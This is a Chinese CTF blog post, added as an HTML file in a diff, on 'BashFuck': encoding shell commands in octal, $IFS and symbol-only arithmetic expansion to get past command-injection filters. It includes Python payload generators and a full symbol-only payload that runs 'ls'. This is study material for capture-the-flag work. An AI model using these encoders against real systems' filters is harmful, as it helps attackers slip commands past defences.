@@ -1,0 +1,399 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>浅谈BashFuck - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="浅谈BashFuck" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/%E6%B5%85%E8%B0%88bashfuck/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T14:34:26+08:00" />
+<meta property="article:modified_time" content="2024-04-14T14:34:26+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="浅谈BashFuck"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/%E6%B5%85%E8%B0%88bashfuck/" /><link rel="prev" href="http://ML-hacker.github.io/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" /><link rel="next" href="http://ML-hacker.github.io/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "浅谈BashFuck",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/%E6%B5%85%E8%B0%88bashfuck/"
+        },"genre": "posts","keywords": "Linux, BashFuck","wordcount":  325 ,
+        "url": "http://ML-hacker.github.io/posts/%E6%B5%85%E8%B0%88bashfuck/","datePublished": "2024-04-14T14:34:26+08:00","dateModified": "2024-04-14T14:34:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">浅谈BashFuck</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;325 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="0x0e前言" class="headerLink">
+    <a href="#0x0e%e5%89%8d%e8%a8%80" class="header-mark"></a>0x0e前言</h1><p>本来是在CTF刷刷题目，然后有个知识点不太明白所以就去找着了lazy师傅问了一下，结果发了一个bashfuck的知识点过来（x，本来一个简单的绕过却有了新的思路，索性来记录一下。</p>
+<p>#注意：因为debian、Ubuntu系统的sh软连接是到dash的，centos的sh软链接连接到bash，但是kali的zsh不是很兼容dash所以IFS就解析不了，还是直接用空格代替即可</p>
+<h1 id="0x01common_oct" class="headerLink">
+    <a href="#0x01common_oct" class="header-mark"></a>0x01common_oct</h1><p>这个就是最常规的可以用十六进制，或者八进制来执行命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sum_data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">str1</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入要转化的命令:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">str1</span> <span class="o">=</span> <span class="n">str1</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>  <span class="c1"># 去除首尾空格</span>
+</span></span><span class="line"><span class="cl"><span class="n">data_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span>  <span class="c1"># 判断总长度来循环</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">data_len</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">str1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">):</span>  <span class="c1"># 检查空格字符</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sum_data</span> <span class="o">+=</span> <span class="s2">&#34;&#39;$IFS$&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data_8</span> <span class="o">=</span> <span class="nb">oct</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">final_data</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">data_8</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sum_data</span> <span class="o">+=</span> <span class="n">final_data</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;common_oct&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;$&#39;&#34;</span> <span class="o">+</span> <span class="n">sum_data</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>出来直接使用即可，在kali里面的ifs直接用空格代替即可
+example：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="s1">$&#39;\154\163&#39;</span> <span class="c1">#= ls</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="0x02bashfuck_x" class="headerLink">
+    <a href="#0x02bashfuck_x" class="header-mark"></a>0x02bashfuck_x</h1><p>运用到的原理就是算术拓展<code>$(())</code>，这个的返回值为0，并且可以有这种用法<code>$((1&lt;&lt;1)#2binary)</code>来构造出一些命令
+还是拿ls来举例子，如果不去利用二进制来构造可以这么写</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="s2">&#34;</span>$<span class="s2">&#34;</span><span class="s1">&#39;&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;\&#39;</span><span class="k">$(($((</span><span class="m">1</span><span class="k">))</span><span class="m">54</span><span class="k">))</span><span class="s1">&#39;\&#39;</span><span class="k">$(($((</span><span class="m">1</span><span class="k">))</span><span class="m">63</span><span class="k">))</span><span class="se">\&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造出来就是common_oct的写法
+然后这里也可以使用二进制来构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$<span class="se">\&#39;\\</span><span class="k">$(($((</span><span class="m">1</span><span class="s">&lt;&lt;1))#1</span><span class="m">0011010</span><span class="k">))</span><span class="se">\\</span><span class="k">$(($((</span><span class="m">1</span><span class="s">&lt;&lt;1))#1</span><span class="m">0100011</span><span class="k">))</span><span class="se">\&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为相对于前面的你构造出54啊或者是其他数字比较麻烦，而在探姬师傅的wiki下面说明了几种可以表示0和1的方法，所以用01来代替能利用py快速的得出结果并且可以实现无数字来打
+一些对应：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt;echo <span class="si">${#}</span>
+</span></span><span class="line"><span class="cl">&gt;0
+</span></span><span class="line"><span class="cl">&gt;echo <span class="si">${#</span><span class="p">#</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">&gt;1
+</span></span><span class="line"><span class="cl">&gt;echo <span class="si">${#</span><span class="nv">_</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">&gt;1
+</span></span><span class="line"><span class="cl">&gt;echo <span class="si">${</span><span class="nv">_</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">&gt;1
+</span></span><span class="line"><span class="cl">&gt;echo <span class="si">${</span><span class="p">?</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">&gt;0
+</span></span><span class="line"><span class="cl">&gt;echo <span class="si">${</span><span class="p">?#</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl">&gt;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等等都可以用来构造
+下面附上相关函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bashfuck_x</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">form</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bash_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bash_str</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">$(($((1&lt;&lt;1))#</span><span class="si">{</span><span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">get_oct</span><span class="p">(</span><span class="n">c</span><span class="p">)))[</span><span class="mi">2</span><span class="p">:]</span><span class="si">}</span><span class="s1">))&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload_bit</span> <span class="o">=</span> <span class="n">bash_str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload_zero</span> <span class="o">=</span> <span class="n">bash_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;${##}&#39;</span><span class="p">)</span>  <span class="c1"># 用 ${##} 来替换 1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload_c</span> <span class="o">=</span> <span class="n">bash_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;${##}&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;${#}&#39;</span><span class="p">)</span>  <span class="c1"># 用 ${#} 来替换 0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">form</span> <span class="o">==</span> <span class="s1">&#39;bit&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload_bit</span> <span class="o">=</span> <span class="s1">&#39;$0&lt;&lt;&lt;$0</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">$</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload_bit</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">info</span><span class="p">(</span><span class="n">payload_bit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">form</span> <span class="o">==</span> <span class="s1">&#39;zero&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload_zero</span> <span class="o">=</span> <span class="s1">&#39;$0&lt;&lt;&lt;$0</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">$</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload_zero</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">info</span><span class="p">(</span><span class="n">payload_zero</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">form</span> <span class="o">==</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload_c</span> <span class="o">=</span> <span class="s1">&#39;${!#}&lt;&lt;&lt;${!#}</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">&lt;</span><span class="se">\\</span><span class="s1">$</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload_c</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\\\&#39;</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">info</span><span class="p">(</span><span class="n">payload_c</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这里需要解决一个问题，你会发现你直接执行命令是没办法执行的，这里探姬师傅也是给出了相关的连接
+<a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html" target="_blank" rel="noopener noreferrer">https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html</a>
+总的来说就是扩展顺序，我们在八进制转义的时候已经扩展了一次，所以后面不会再次解析
+所以这里就用标准输出来完成解析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/bin/bash<span class="o">&lt;&lt;&lt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以最后的playload的前面要加上:<code>$0&lt;&lt;&lt;</code>
+<code>$0</code> 可以表示当前脚本的文件名，在终端中，<code>$0</code>其实就是bash本身。</p>
+<h1 id="0x03bashfuck_y" class="headerLink">
+    <a href="#0x03bashfuck_y" class="header-mark"></a>0x03bashfuck_y</h1><p>这里和上面的都差不多只是对-1的取反进行了利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
+</span></span><span class="line"><span class="cl">    &#39;$(())&#39;,  # 0
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))))))&#39;,  # 1
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#39;,  # 2
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#39;,  # 3
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#39;,  # 4
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#39;,  # 5
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#39;,  # 6
+</span></span><span class="line"><span class="cl">    &#39;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#39;,  # 7
+</span></span><span class="line"><span class="cl">]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就可以使用<code>$(())</code>去构造<code>$'\xxx\xxx\xxx\xxx'</code></p>
+<p>再引入我们前面提到的，变量赋值，我们就可以轻松的用<code>$(())</code>拿到sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">bashFuck</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">bashFuck</span> <span class="o">+=</span> <span class="s1">&#39;__=$(())&#39;</span>  <span class="c1"># set __ to 0</span>
+</span></span><span class="line"><span class="cl"><span class="nv">bashFuck</span> <span class="o">+=</span> <span class="s1">&#39;&amp;&amp;&#39;</span>  <span class="c1"># splicing</span>
+</span></span><span class="line"><span class="cl"><span class="nv">bashFuck</span> <span class="o">+=</span> <span class="s1">&#39;${!__}&lt;&lt;&lt;${!__}\\&lt;\\&lt;\\&lt;\\$\\\&#39;&#39;  # got &#39;</span>sh<span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1"># bashFuck = __=$(())&amp;&amp;${!__}&lt;&lt;&lt;${!__}\\&lt;\\&lt;\\&lt;\\$\\\&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到我们第四种playload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Command:ls
+</span></span><span class="line"><span class="cl">Charset : ! $ <span class="p">&amp;</span> <span class="s1">&#39; ( ) &lt; = \ _ { } ~
+</span></span></span><span class="line"><span class="cl"><span class="s1">Total Used: 13
+</span></span></span><span class="line"><span class="cl"><span class="s1">Total length = 393
+</span></span></span><span class="line"><span class="cl"><span class="s1">Payload = __=$(())&amp;&amp;${!__}&lt;&lt;&lt;${!__}\&lt;\&lt;\&lt;\$\&#39;</span><span class="se">\\</span><span class="k">$((</span>~<span class="k">$(($((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))))))$((</span>~<span class="k">$(($((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))))))$((</span>~<span class="k">$(($((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))))))</span><span class="se">\\</span><span class="k">$((</span>~<span class="k">$(($((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))))))$((</span>~<span class="k">$(($((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))))))$((</span>~<span class="k">$(($((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))$((</span>~<span class="k">$(())))))))</span><span class="se">\&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考文章：
+<a href="https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/bashfuck/">BashFuck</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" class="prev" rel="prev" title="深入浅出-Hash长度拓展攻击"><i class="fas fa-angle-left fa-fw"></i>深入浅出-Hash长度拓展攻击</a>
+            <a href="/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/" class="next" rel="next" title="PYTHON安全问题总结(一)">PYTHON安全问题总结(一)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
